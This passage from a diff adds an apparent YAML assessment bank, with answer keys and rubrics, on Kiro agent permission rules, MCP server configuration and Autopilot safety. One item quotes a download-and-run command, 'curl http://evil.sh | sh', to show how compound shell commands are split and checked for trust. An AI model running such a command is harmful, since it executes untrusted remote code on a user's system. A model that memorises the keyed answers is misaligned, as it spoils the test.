+      `capability: all` with `effect: allow` is the documented pattern for CI pipelines
+      that need full, unprompted access.
+  - id: kmt-300-mc-h
+    tier: 300
+    bloom: apply
+    difficulty: 350
+    type: multiple_choice
+    prompt: |
+      You configure a remote MCP server that requires OAuth. Besides `url`, which field set is
+      appropriate to add?
+    choices:
+      - id: a
+        text: command and args
+      - id: b
+        text: oauth and oauthScopes
+      - id: c
+        text: env with a hardcoded bearer token only
+      - id: d
+        text: a "stdio" transport field
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Remote servers add `oauth` and `oauthScopes` (and optionally `headers`) alongside
+      `url`. `command`/`args` and `transport: stdio` are for local servers.
+  - id: kmt-300-mc-i
+    tier: 300
+    bloom: apply
+    difficulty: 365
+    type: multiple_choice
+    prompt: |
+      A server exposes a dangerous `delete_all` tool you never want the agent to call, even by
+      mistake. Which field removes it from the agent's reach entirely?
+    choices:
+      - id: a
+        text: '"autoApprove": []'
+      - id: b
+        text: '"disabled": true'
+      - id: c
+        text: '"disabledTools": ["delete_all"]'
+      - id: d
+        text: '"autoApprove": ["delete_all"]'
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      `disabledTools: ["delete_all"]` excludes just that tool while keeping the server's
+      other tools available. `disabled: true` would turn off the whole server.
+  - id: kmt-300-mc-j
+    tier: 300
+    bloom: apply
+    difficulty: 335
+    type: multiple_choice
+    prompt: |
+      During a Kiro IDE Autopilot run that made many edits, you realize the approach is wrong.
+      What is the correct way to undo them?
+    choices:
+      - id: a
+        text: There is no way to undo Autopilot edits; they are final
+      - id: b
+        text: Use Autopilot's View all changes / Revert controls to roll back
+      - id: c
+        text: Delete the .kiro/settings folder
+      - id: d
+        text: Switch to Supervised mode, which auto-reverts the prior run
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Autopilot still lets you View all changes, Revert, and interrupt; switching modes
+      does not retroactively undo prior edits.
+  - id: kmt-300-mc-k
+    tier: 300
+    bloom: apply
+    difficulty: 355
+    type: multiple_choice
+    prompt: |
+      A developer wants to commit a team-shared MCP server config so every clone of the repo
+      gets it. Where should they put it?
+    choices:
+      - id: a
+        text: ~/.kiro/settings/mcp.json
+      - id: b
+        text: .kiro/settings/mcp.json (committed to the repo)
+      - id: c
+        text: ~/.kiro/workspace-roots/<hash>/permissions.yaml
+      - id: d
+        text: .vscode/settings.json
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Workspace `.kiro/settings/mcp.json` lives in the repo and is shared on clone.
+      The user path is per-machine; permissions.yaml is for trust, not MCP servers.
+  - id: kmt-300-mc-l
+    tier: 300
+    bloom: apply
+    difficulty: 345
+    type: multiple_choice
+    prompt: |
+      You want trust for the exact command `git pull --rebase` only, not all `git pull`
+      variants. In the v2 tiered shell model, which tier do you pick?
+    choices:
+      - id: a
+        text: Full command (git pull --rebase)
+      - id: b
+        text: Partial (git pull *)
+      - id: c
+        text: Base (git *)
+      - id: d
+        text: Entire Tool (*)
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      The Full command tier trusts exactly `git pull --rebase`. Partial (`git pull *`),
+      Base (`git *`), and Entire Tool (`*`) progressively widen the scope.
+  - id: kmt-300-mc-m
+    tier: 300
+    bloom: apply
+    difficulty: 360
+    type: multiple_choice
+    prompt: |
+      You want the agent to read files but require a prompt before any write, in v3. Which
+      rule pair expresses this?
+    choices:
+      - id: a
+        text: allow fs_read; ask fs_write
+      - id: b
+        text: allow fs_read; allow fs_write
+      - id: c
+        text: deny fs_read; ask fs_write
+      - id: d
+        text: ask fs_read; deny fs_write
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      `allow fs_read` lets reads run unprompted; `ask fs_write` requires confirmation
+      before each write. This is the classic read-free, write-confirmed posture.
+  - id: kmt-300-ff-a
+    tier: 300
+    bloom: apply
+    difficulty: 330
+    type: free_form
+    prompt: |
+      Write the JSON for a single LOCAL MCP server named `time` that runs `uvx mcp-server-time`,
+      auto-approves only its `get_current_time` tool, and reads a `TZ` value from the environment.
+    guidance: >
+      Looks for correct local-server shape: command, args array, env with ${...}, scoped
+      autoApprove.
+    rubric:
+      criteria:
+        - id: c1
+          text: Uses mcpServers root and a local server with command "uvx" and args ["mcp-server-time"]
+        - id: c2
+          text: env sets the TZ key via ${...} expansion (so TZ resolves from the environment)
+        - id: c3
+          text: autoApprove lists only ["get_current_time"], not "*"
+      referenceAnswer: |
+        {
+          "mcpServers": {
+            "time": {
+              "command": "uvx",
+              "args": ["mcp-server-time"],
+              "env": { "TZ": "${TZ}" },
+              "autoApprove": ["get_current_time"]
+            }
+          }
+        }
+      passThreshold: 0.6
+  - id: kmt-300-ff-b
+    tier: 300
+    bloom: apply
+    difficulty: 350
+    type: free_form
+    prompt: |
+      Describe the steps to grant Kiro CLI v2 trust for all `npm` commands during the current
+      session without trusting the entire shell tool, then how to undo it.
+    guidance: |
+      Looks for correct use of the tiered shell trust and the untrust/reset path.
+    rubric:
+      criteria:
+        - id: c1
+          text: Trust the base pattern npm * (e.g. via the Trust option scoped to npm), not shell *
+        - id: c2
+          text: Notes trusted shell patterns persist only for the session
+        - id: c3
+          text: To undo, use /tools untrust (or /tools reset) for that pattern/tool
+      referenceAnswer: |
+        When prompted for an npm command, choose Trust and scope it to the base pattern
+        `npm *` rather than the Entire Tool `*`. That pattern is stored as a regex in the
+        agent's allowedCommands and persists for the session only. To undo, run
+        `/tools untrust` for that pattern (or `/tools reset` to clear all session trust).
+      passThreshold: 0.6
+  - id: kmt-300-ff-c
+    tier: 300
+    bloom: apply
+    difficulty: 360
+    type: free_form
+    prompt: |
+      A repo's docs say "the agent must be able to write anywhere in the project except
+      `.git/` and `node_modules/`." Sketch the v3 permission rules that achieve this.
+    guidance: |
+      Looks for an allow with excludes (or allow + denies) using deny>allow precedence.
+    rubric:
+      criteria:
+        - id: c1
+          text: An allow fs_write rule matching the project (e.g. "**" or "src/**" + others)
+        - id: c2
+          text: Deny (or exclude) fs_write for .git/** and node_modules/**
+        - id: c3
+          text: Notes deny > allow so the excludes/denies win over the broad allow
+      referenceAnswer: |
+        allow fs_write match "**", then deny fs_write match ".git/**" and deny fs_write
+        match "node_modules/**" (or equivalently an allow with exclude: [".git/**",
+        "node_modules/**"]). Because deny > ask > allow, the deny rules win over the broad
+        allow, so the agent can write everywhere except those two trees. (Note Kiro's
+        hardcoded scope already ASKS before writing to .git anyway.)
+      passThreshold: 0.6
+  - id: kmt-300-ff-d
+    tier: 300
+    bloom: apply
+    difficulty: 340
+    type: free_form
+    prompt: |
+      You are about to let Kiro Autopilot refactor across many files in an unfamiliar codebase.
+      Describe a safe workflow that still benefits from autonomy.
+    guidance: |
+      Looks for practical risk-managed use of Autopilot/Supervised plus revert.
+    rubric:
+      criteria:
+        - id: c1
+          text: Work on a branch / clean git state so changes can be reviewed and reverted
+        - id: c2
+          text: Use Supervised mode (or Autopilot with frequent View changes/Revert) for the risky parts
+        - id: c3
+          text: Verify with tests/diff review before accepting
+      referenceAnswer: |
+        Start from a clean branch so everything is reviewable and revertible. For an
+        unfamiliar codebase, run the risky refactor in Supervised mode so you accept/reject
+        each hunk, or use Autopilot but check "View all changes" and Revert if it drifts.
+        Run the test suite and review the diff before committing. This keeps autonomy while
+        bounding blast radius.
+      passThreshold: 0.6
+  - id: kmt-300-ff-e
+    tier: 300
+    bloom: apply
+    difficulty: 355
+    type: free_form
+    prompt: |
+      A remote MCP server is configured but the agent reports it cannot reach it. Give a concrete
+      checklist of MCP-config things to verify (at least three).
+    guidance: |
+      Looks for url scheme, disabled flag, headers/oauth, and merge/precedence checks.
+    rubric:
+      criteria:
+        - id: c1
+          text: Verify url uses HTTPS (HTTP only allowed for localhost) and is reachable
+        - id: c2
+          text: Check disabled is not true and that workspace/user merge isn't overriding the block
+        - id: c3
+          text: Verify auth (headers / oauth / oauthScopes) and env-var expansion resolve correctly
+      referenceAnswer: |
+        1) Confirm `url` is HTTPS (HTTP is only allowed for localhost) and the endpoint is
+        reachable. 2) Confirm `"disabled"` is not true, and that a workspace-level block of
+        the same name isn't overriding (or a user-level one isn't being shadowed) given the
+        merge/precedence rules. 3) Confirm auth: `headers`/`oauth`/`oauthScopes` are correct
+        and any `${VAR}` expansions actually resolve in the environment.
+      passThreshold: 0.6
+  - id: kmt-300-ff-f
+    tier: 300
+    bloom: apply
+    difficulty: 365
+    type: free_form
+    prompt: |
+      Express, in v3 rule terms, "the agent may call only the `search` tool on the `brave` MCP
+      server and nothing else through MCP." Describe the rules.
+    guidance: |
+      Looks for the mcp capability with server/tool pattern plus a default deny.
+    rubric:
+      criteria:
+        - id: c1
+          text: Uses the mcp capability with a server/tool pattern like brave/search
+        - id: c2
+          text: Allows brave/search and denies (or does not allow) other mcp calls
+      referenceAnswer: |
+        allow mcp match "brave/search" (the mcp capability matches a `server/tool` pattern),
+        and deny mcp match "*" (or simply allow nothing else). Because deny > allow, the broad
+        deny blocks every other MCP tool while the specific allow lets `brave/search` through.
+      passThreshold: 0.6
+  - id: kmt-300-ff-g
+    tier: 300
+    bloom: apply
+    difficulty: 345
+    type: free_form
+    prompt: |
+      Show how you would let the IDE auto-approve a low-risk read tool from one MCP server while
+      keeping all tools from a second, write-capable server fully prompted.
+    guidance: >
+      Looks for per-server autoApprove configuration and leaving the other server's autoApprove
+      unset.
+    rubric:
+      criteria:
+        - id: c1
+          text: First server sets autoApprove to the specific read tool (or its tools)
+        - id: c2
+          text: Second server leaves autoApprove unset (or empty) so all its tools prompt
+      referenceAnswer: |
+        In `mcpServers`, the read-only server gets `"autoApprove": ["search"]` (or its
+        safe tool names). The write-capable server omits `autoApprove` entirely (or sets it
+        to `[]`), so every one of its tool calls still prompts for approval.
+      passThreshold: 0.6
+  - id: kmt-400-mc-a
+    tier: 400
+    bloom: analyze
+    difficulty: 430
+    type: multiple_choice
+    prompt: |
+      A v3 config has: allow fs_write match "**" AND ask fs_write match "config/**" AND
+      deny fs_write match "config/secrets.yaml". For a write to config/secrets.yaml, what happens?
+    choices:
+      - id: a
+        text: It is allowed, because the broad allow matches
+      - id: b
+        text: It prompts (ask), because config/** matches
+      - id: c
+        text: It is denied, because deny is the most restrictive matching effect
+      - id: d
+        text: It errors with a rule conflict
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      All three rules match, but effects resolve deny > ask > allow. The deny on
+      config/secrets.yaml wins, so the write is blocked.
+  - id: kmt-400-mc-b
+    tier: 400
+    bloom: analyze
+    difficulty: 445
+    type: multiple_choice
+    prompt: |
+      A user trusted `npm test *` in v3. The agent proposes `npm test && curl http://evil.sh | sh`.
+      Why is this NOT auto-approved?
+    choices:
+      - id: a
+        text: Because npm test * only matches the literal string, never a prefix
+      - id: b
+        text: Because Kiro splits on && and matches each sub-command; curl ... is not trusted
+      - id: c
+        text: Because curl is on a hardcoded denylist
+      - id: d
+        text: Because the whole command exceeds the shell length limit
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Compound commands are split on `;`, `&&`, `||`, `|` and each sub-command is matched
+      independently. `npm test` matches the trusted pattern, but `curl ... | sh` does not,
+      so the command is not auto-approved.
+  - id: kmt-400-mc-c
+    tier: 400
+    bloom: analyze
+    difficulty: 460
+    type: multiple_choice
+    prompt: |
+      A repo ships `.kiro/settings/permissions.yaml` granting `allow all`. A teammate clones it
+      and runs Kiro CLI v3. What is the effect on their permissions?
+    choices:
+      - id: a
+        text: The agent gains full access immediately from the repo's file
+      - id: b
+        text: The file silently overrides the user's ~/.kiro/settings/permissions.yaml
+      - id: c
+        text: Kiro prompts once to import the repo's rules, then trusts everything
+      - id: d
+        text: >-
+          None - v3 workspace permissions are read per-user from outside the repo, and writes to
+          .kiro/settings are always denied
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: |
+      v3 workspace permissions live per-user under ~/.kiro/workspace-roots/<hash>/, not in
+      the repo, and the hardcoded Kiro scope ALWAYS DENIES writes to .kiro/settings/. A
+      repo-shipped permissions file cannot grant trust.
+  - id: kmt-400-mc-d
+    tier: 400
+    bloom: analyze
+    difficulty: 440
+    type: multiple_choice
+    prompt: |
+      The same MCP server name appears in BOTH workspace and user configs, but with different
+      `args`. The server starts with the workspace `args`. Some user-only fields still apply.
+      What best explains this?
+    choices:
+      - id: a
+        text: The user config is ignored entirely once a workspace config exists
+      - id: b
+        text: Kiro starts two separate servers, one per scope
+      - id: c
+        text: >-
+          Configs merge; on per-field conflict workspace wins, but non-conflicting user fields
+          survive
+      - id: d
+        text: The args field is the only field that ever merges
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      The two configs merge. Where a field conflicts (like `args`) the workspace value
+      wins, but fields present only in the user config are not discarded.
+  - id: kmt-400-mc-e
+    tier: 400
+    bloom: analyze
+    difficulty: 455
+    type: multiple_choice
+    prompt: |
+      An MCP tool runs even though it is listed in the server's `disabledTools`. The most likely
+      explanation is:
+    choices:
+      - id: a
+        text: >-
+          A different server (merged from another scope) exposes a tool of the same name that is NOT
+          disabled
+      - id: b
+        text: disabledTools is advisory and never enforced
+      - id: c
+        text: disabledTools only disables tools at startup, not at call time
+      - id: d
+        text: The tool name in disabledTools must be uppercase to match
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      Because workspace and user configs merge, a same-named tool exposed by another
+      server (or the same server defined in the other scope without that disable) can
+      still be reachable. The disable is per-server, not global by tool name.
+  - id: kmt-400-mc-f
+    tier: 400
+    bloom: analyze
+    difficulty: 465
+    type: multiple_choice
+    prompt: |
+      A v3 rule set has only: ask fs_write match "**". A write to `.git/config` occurs. What
+      governs the outcome?
+    choices:
+      - id: a
+        text: The user's ask rule alone - it prompts like any other write
+      - id: b
+        text: It is allowed because .git is outside the workspace
+      - id: c
+        text: It is always denied because .git is read-only to the agent
+      - id: d
+        text: >-
+          Kiro's hardcoded scope ALWAYS ASKS for writes to .git/**, which the user rule cannot relax
+          below ask
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: |
+      Kiro's hardcoded scope ALWAYS ASKS for writes to `.git/**` (and .kiro/agents,
+      .kiro/hooks, .kiroignore). A user `ask` matches that floor; no user rule can make
+      it `allow`.
+  - id: kmt-400-mc-g
+    tier: 400
+    bloom: analyze
+    difficulty: 435
+    type: multiple_choice
+    prompt: |
+      A team auto-approved `["*"]` on a write-capable MCP server "to reduce prompts." During an
+      Autopilot run the agent calls a destructive tool unexpectedly. What is the root cause?
+    choices:
+      - id: a
+        text: Autopilot is incompatible with autoApprove
+      - id: b
+        text: The server should have used disabled instead of autoApprove
+      - id: c
+        text: >-
+          Blanket autoApprove on a side-effecting server removed the only confirmation gate, and
+          Autopilot does not prompt per step
+      - id: d
+        text: autoApprove only applies to read tools, so this is a bug
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      `autoApprove: ["*"]` suppresses prompts for ALL of that server's tools including
+      destructive ones, and Autopilot already runs without per-step approval, so nothing
+      stopped the call. The fix is to scope autoApprove to safe tools only.
+  - id: kmt-400-mc-h
+    tier: 400
+    bloom: analyze
+    difficulty: 470
+    type: multiple_choice
+    prompt: |
+      You trusted `git *` (base tier) in v2. Later you want to ensure `git push` ALWAYS prompts.
+      Why can't you simply add a "prompt git push" entry alongside the existing base trust, and
+      what is the cleanest fix?
+    choices:
+      - id: a
+        text: >-
+          You can't; instead untrust the broad git * and trust only the narrower safe patterns (e.g.
+          git status, git diff)
+      - id: b
+        text: Just add git push to autoApprove with a negative sign
+      - id: c
+        text: Base trust already excludes git push, so nothing is needed
+      - id: d
+        text: Set disabledTools to ["git push"] on the shell tool
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      v2 session trust is additive patterns, not a deny list; a broad `git *` already
+      covers `git push`. The cleanest fix is to untrust `git *` and trust only the
+      narrower safe commands so `git push` falls back to prompting.
+  - id: kmt-400-mc-i
+    tier: 400
+    bloom: analyze
+    difficulty: 450
+    type: multiple_choice
+    prompt: >
+      Two v3 rules match a shell command: ask shell match "deploy*" and allow shell match
+      "deploy-staging".
+
+      The command is `deploy-staging`. What happens and why?
+    choices:
+      - id: a
+        text: Allowed, because the more specific rule wins regardless of effect
+      - id: b
+        text: Denied, because two rules matching is a conflict
+      - id: c
+        text: Allowed, because allow rules are evaluated last
+      - id: d
+        text: Prompts (ask), because ask is more restrictive than allow and both match
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: |
+      v3 resolves by restrictiveness, not specificity: deny > ask > allow. Both rules
+      match `deploy-staging`, so the `ask` wins and it prompts.
+  - id: kmt-400-mc-j
+    tier: 400
+    bloom: analyze
+    difficulty: 460
+    type: multiple_choice
+    prompt: |
+      An IDE user reports their `~/.kiro/settings/mcp.json` server "disappears" whenever they open
+      a particular project. The most likely cause is:
+    choices:
+      - id: a
+        text: >-
+          The project's .kiro/settings/mcp.json defines the same server name with "disabled": true,
+          and workspace precedence wins
+      - id: b
+        text: User configs are never loaded inside a workspace
+      - id: c
+        text: The MCP server crashed on startup
+      - id: d
+        text: Opening a project clears the user config file
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      Because configs merge with workspace precedence, a workspace entry of the same name
+      with `disabled: true` overrides the user's enabled server, effectively hiding it in
+      that project.
+  - id: kmt-400-mc-k
+    tier: 400
+    bloom: analyze
+    difficulty: 440
+    type: multiple_choice
+    prompt: |
+      A "Run all Tasks" in a Kiro spec finishes faster than running tasks one-by-one. Which
+      mechanism best explains the speedup?
+    choices:
+      - id: a
+        text: It skips tasks marked required
+      - id: b
+        text: It disables all hooks during execution
+      - id: c
+        text: It builds a dependency graph and runs independent tasks concurrently in waves
+      - id: d
+        text: It caches the model's previous responses
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      "Run all Tasks" builds a dependency graph and groups independent tasks into waves
+      that execute concurrently, which is faster than strictly sequential execution.
+  - id: kmt-400-mc-l
+    tier: 400
+    bloom: analyze
+    difficulty: 475
+    type: multiple_choice
+    prompt: |
+      A PreToolUse hook exits with code 2 and writes to STDERR. What is the effect on the tool
+      call, and where does the STDERR go?
+    choices:
+      - id: a
+        text: The tool runs anyway; STDERR is discarded
+      - id: b
+        text: The tool call is BLOCKED and the STDERR is returned to the agent as feedback
+      - id: c
+        text: The session ends immediately
+      - id: d
+        text: The STDERR is added to context only for SessionStart hooks
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Exit code 2 blocks execution for blockable triggers (PreToolUse, UserPromptSubmit,
+      PreTaskExec) and the hook's STDERR is returned to the agent. Other non-zero codes
+      are warnings that proceed.
+  - id: kmt-400-mc-m
+    tier: 400
+    bloom: analyze
+    difficulty: 455
+    type: multiple_choice
+    prompt: |
+      A teammate insists "trusting the shell tool means trusting every command." Why is this
+      an oversimplification in Kiro?
+    choices:
+      - id: a
+        text: Because shell commands never require trust
+      - id: b
+        text: Because trusting shell only affects read commands
+      - id: c
+        text: Because the shell tool is always denied by the hardcoded scope
+      - id: d
+        text: >-
+          Because shell trust is tiered - you can trust only a full command, a partial pattern, or a
+          base command without trusting * (entire tool)
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: |
+      Shell trust is tiered: Full command -> Partial (`git pull *`) -> Base (`git *`) ->
+      Entire Tool (`*`). Trusting a narrow tier is not the same as trusting `*`.
+  - id: kmt-400-ff-a
+    tier: 400
+    bloom: analyze
+    difficulty: 450
+    type: free_form
+    prompt: |
+      A v3 config contains, in this order: allow shell match "*"; deny shell match "rm *";
+      ask shell match "rm -rf *". Walk through what happens for `rm -rf build/` and explain
+      whether rule order matters.
+    guidance: |
+      Looks for correct application of deny>ask>allow and that order is irrelevant.
+    rubric:
+      criteria:
+        - id: c1
+          text: Identifies that all three rules match rm -rf build/
+        - id: c2
+          text: Concludes it is DENIED because deny is most restrictive
+        - id: c3
+          text: States rule order does not matter; restrictiveness, not order, decides
+      referenceAnswer: |
+        All three match `rm -rf build/`: the `*` allow, the `rm *` deny, and the `rm -rf *`
+        ask. Resolution is by restrictiveness (deny > ask > allow), not by order, so the
+        `deny` wins and the command is blocked. Reordering the rules would not change the
+        outcome.
+      passThreshold: 0.6
+  - id: kmt-400-ff-b
+    tier: 400
+    bloom: analyze
+    difficulty: 465
+    type: free_form
+    prompt: |
+      Diagnose: a developer added `"autoApprove": ["*"]` to a filesystem MCP server and is now
+      surprised the agent edited files outside the project in an Autopilot session. Break down
+      the two independent factors that combined to allow this, and what each does NOT control.
+    guidance: >
+      Looks for separating MCP autoApprove (prompting) from CLI/IDE path trust and Autopilot
+      autonomy.
+    rubric:
+      criteria:
+        - id: c1
+          text: autoApprove only suppresses the per-tool approval PROMPT for that MCP server's tools
+        - id: c2
+          text: Autopilot already runs without per-step approval, so no gate stopped the call
+        - id: c3
+          text: >-
+            Notes autoApprove does not itself define path scope; that is the tool's own
+            args/permission rules
+      referenceAnswer: |
+        Two factors combined. (1) `autoApprove: ["*"]` removed the confirmation prompt for
+        every tool that server exposes - including writes. (2) Autopilot already runs
+        autonomously without per-step approval, so once prompting was suppressed nothing
+        gated the call. Crucially, `autoApprove` does NOT define which paths the server may
+        touch; that scope comes from the server's own configuration / args and any
+        path-level permission rules. The fix is to scope autoApprove to safe tools and
+        constrain the filesystem server's allowed roots.
+      passThreshold: 0.6
+  - id: kmt-400-ff-c
+    tier: 400
+    bloom: analyze
+    difficulty: 455
+    type: free_form
+    prompt: |
+      Why would importing the same MCP-sourced requirements into two different workspaces still
+      produce different agent behavior, even with identical mcp.json server blocks? Identify at
+      least two config-level reasons.
+    guidance: >
+      Looks for merge/precedence with user config, autoApprove/disabledTools differences, env
+      values.
+    rubric:
+      criteria:
+        - id: c1
+          text: Each workspace merges with the SAME user-level config, which may differ per machine
+        - id: c2
+          text: >-
+            Differing autoApprove/disabledTools or disabled flags across scopes change which tools
+            run
+        - id: c3
+          text: Env-var expansion resolves to different values per environment
+      referenceAnswer: |
+        Even with identical workspace blocks: (1) each workspace merges with the per-machine
+        user-level `~/.kiro/settings/mcp.json`, so a server enabled/disabled or extended
+        there changes behavior; (2) `autoApprove`/`disabledTools`/`disabled` may differ
+        between the merged scopes, changing which tools are callable or prompted; and (3)
+        `${VAR}` expansions resolve to different values (API keys, endpoints, TZ) per
+        environment, so the same server behaves differently.
+      passThreshold: 0.6
+  - id: kmt-400-ff-d
+    tier: 400
+    bloom: analyze
+    difficulty: 470
+    type: free_form
+    prompt: |
+      A security reviewer claims "a malicious PR could grant the Kiro agent broad trust by adding
+      a permissions file to the repo." Evaluate this claim against Kiro CLI v3's design and name
+      the specific protections that defeat it.
+    guidance: >
+      Looks for per-user workspace permission storage plus the hardcoded deny on .kiro/settings
+      writes.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            v3 workspace permissions are stored per-user outside the repo
+            (~/.kiro/workspace-roots/<hash>/)
+        - id: c2
+          text: >-
+            The hardcoded Kiro scope ALWAYS DENIES writes to ~/.kiro/settings/, .kiro/settings/, and
+            workspace-roots
+        - id: c3
+          text: Concludes the claim is false - a repo cannot inject trust
+      referenceAnswer: |
+        The claim is false by design. v3 workspace permissions are read per-user from
+        ~/.kiro/workspace-roots/<hash>/permissions.yaml, not from the repo, so a checked-in
+        file is not the trust source. Additionally Kiro's hardcoded scope ALWAYS DENIES
+        writes to ~/.kiro/settings/, .kiro/settings/, and ~/.kiro/workspace-roots/, so the
+        agent cannot even be tricked into writing such a file. A malicious PR therefore
+        cannot escalate the agent's trust.
+      passThreshold: 0.6
+  - id: kmt-400-ff-e
+    tier: 400
+    bloom: analyze
+    difficulty: 440
+    type: free_form
+    prompt: |
+      An MCP server's tool sometimes prompts and sometimes does not within the same project.
+      Enumerate the likely config-level causes and how you would isolate which one applies.
+    guidance: |
+      Looks for autoApprove scope, batch Trust choice, default read-in-CWD trust, merge differences.
+    rubric:
+      criteria:
+        - id: c1
+          text: autoApprove may list some tools but not others, so only listed ones skip prompts
+        - id: c2
+          text: Choosing Trust on a prior call auto-approved later same-tool calls in that batch
+        - id: c3
+          text: >-
+            Describes isolating by checking the merged config and which tool name was actually
+            invoked
+      referenceAnswer: |
+        Likely causes: (1) `autoApprove` lists only some of the server's tools, so the
+        unlisted ones still prompt; (2) earlier in the batch you chose "Trust", which
+        auto-approved the remaining same-tool invocations, making later calls silent; (3)
+        merge differences mean the tool resolves to a differently-configured server. Isolate
+        by dumping the effective merged config, noting the exact tool name invoked each time,
+        and whether a Trust choice preceded the silent calls.
+      passThreshold: 0.6
+  - id: kmt-400-ff-f
+    tier: 400
+    bloom: analyze
+    difficulty: 460
+    type: free_form
+    prompt: |
+      Compare the v2 session-trust model (`/tools`, additive trusted patterns) with the v3
+      declarative model (`permissions.yaml`, deny/ask/allow). Identify one scenario each handles
+      better and one limitation each has.
+    guidance: |
+      Looks for a genuine tradeoff analysis, not just definitions.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            v2 strength - fast, interactive, in-session trust; limitation - additive only, no deny,
+            lost across sessions
+        - id: c2
+          text: >-
+            v3 strength - declarative, persistent, supports deny/exclude and precedence; limitation
+            - more setup, separate naming scheme
+        - id: c3
+          text: Names a concrete scenario favoring each
+      referenceAnswer: |
+        v2 shines for ad-hoc interactive work: you Trust a pattern mid-session with no file
+        editing, but it is additive (no deny), session-scoped, and lost on restart. v3 shines
+        for durable, auditable policy: declarative deny/ask/allow with exclude globs and
+        deny>ask>allow precedence, ideal for CI or shared baselines, but it needs upfront
+        authoring and uses a different capability naming scheme (fs_read vs read). Use v2 for
+        a quick exploratory session; use v3 to encode a team's standing security posture.
+      passThreshold: 0.6
+  - id: kmt-400-ff-g
+    tier: 400
+    bloom: analyze
+    difficulty: 450
+    type: free_form
+    prompt: |
+      A "Run all Tasks" execution did not re-run a task the developer expected, and ran two
+      others concurrently that they expected to be sequential. Diagnose both observations using
+      Kiro's task-execution model.
+    guidance: |
+      Looks for already-complete tasks being left alone plus dependency-graph wave concurrency.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Untouched task - it was already marked complete, so the run advanced the remaining tasks
+            rather than re-running it
+        - id: c2
+          text: >-
+            Concurrent tasks - the dependency graph found them independent and grouped them into the
+            same wave
+        - id: c3
+          text: >-
+            Notes the fix - encode an explicit dependency so they land in different (sequential)
+            waves
+      referenceAnswer: |
+        "Run all Tasks" tracks each task's status (in-progress / completed) and works through the
+        remaining tasks, so the task it "skipped" was most likely already marked complete and so
+        was not re-run. The two "sequential" tasks ran together because Kiro builds a dependency
+        graph and the graph saw no edge between them, placing both in the same concurrent wave
+        (waves run sequentially; tasks within a wave run concurrently). To fix the ordering, encode
+        an explicit dependency between the two tasks so the scheduler puts them in separate waves.
+      passThreshold: 0.6
+  - id: kmt-500-mc-a
+    tier: 500
+    bloom: evaluate
+    difficulty: 485
+    type: multiple_choice
+    prompt: |
+      A team's standard is to put EVERY MCP server, including ones with personal API keys, in the
+      committed `.kiro/settings/mcp.json` with literal keys "so onboarding is one step." What is
+      the strongest objection?
+    choices:
+      - id: a
+        text: >-
+          It commits secrets to version control; use ${VAR} expansion and keep personal servers in
+          the user config
+      - id: b
+        text: Workspace configs cannot hold remote servers
+      - id: c
+        text: It will make the agent slower to start
+      - id: d
+        text: autoApprove stops working when keys are literal
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      Committing literal keys leaks secrets into git history. The right pattern is shared
+      servers with `${VAR}` expansion in the workspace file, and personal/secret servers in
+      the per-user `~/.kiro/settings/mcp.json`.
+  - id: kmt-500-mc-b
+    tier: 500
+    bloom: evaluate
+    difficulty: 500
+    type: multiple_choice
+    prompt: |
+      To "save time," a team sets `capability: all, effect: allow` in every developer's user-level
+      v3 permissions for daily IDE work. Evaluate this choice.
+    choices:
+      - id: a
+        text: Fine - it is the documented CI pattern, so it is safe everywhere
+      - id: b
+        text: >-
+          Risky - that blanket allow is meant for isolated CI; on dev machines it removes all gating
+          including for destructive operations
+      - id: c
+        text: Impossible - all is not a real capability
+      - id: d
+        text: Harmless because the hardcoded scope still denies everything important
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      `all/allow` is documented for isolated CI pipelines that need full access. Applying it
+      to interactive dev machines removes confirmation for destructive operations; only the
+      narrow hardcoded scope (deny .kiro/settings writes, ask .git) remains.
+  - id: kmt-500-mc-c
+    tier: 500
+    bloom: evaluate
+    difficulty: 510
+    type: multiple_choice
+    prompt: |
+      Which permission posture best balances autonomy and safety for an experienced dev working
+      in a well-tested repo on a feature branch?
+    choices:
+      - id: a
+        text: deny all; ask nothing
+      - id: b
+        text: allow all including destructive shell, since the branch is disposable
+      - id: c
+        text: >-
+          allow fs_read; ask fs_write and shell for risky patterns; deny writes to secrets/.git-like
+          paths
+      - id: d
+        text: ask for every read and write to maximize oversight
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      A layered posture - reads free, writes/shell prompted for risky patterns, hard denies
+      on secrets - keeps Autopilot productive while bounding blast radius. Blanket allow or
+      blanket ask are the unbalanced extremes.
+  - id: kmt-500-mc-d
+    tier: 500
+    bloom: evaluate
+    difficulty: 495
+    type: multiple_choice
+    prompt: |
+      A reviewer proposes auto-approving (`["*"]`) a write-capable "deploy" MCP server because
+      "Autopilot already runs without prompts, so the prompt is redundant." Judge this reasoning.
+    choices:
+      - id: a
+        text: Sound - if Autopilot does not prompt, autoApprove changes nothing
+      - id: b
+        text: Sound - deploy tools are read-only by definition
+      - id: c
+        text: Flawed only because deploy servers cannot be remote
+      - id: d
+        text: >-
+          Flawed - the per-tool prompt is the last gate even in Autopilot for sensitive tools, and
+          autoApprove permanently removes it for all of that server's tools
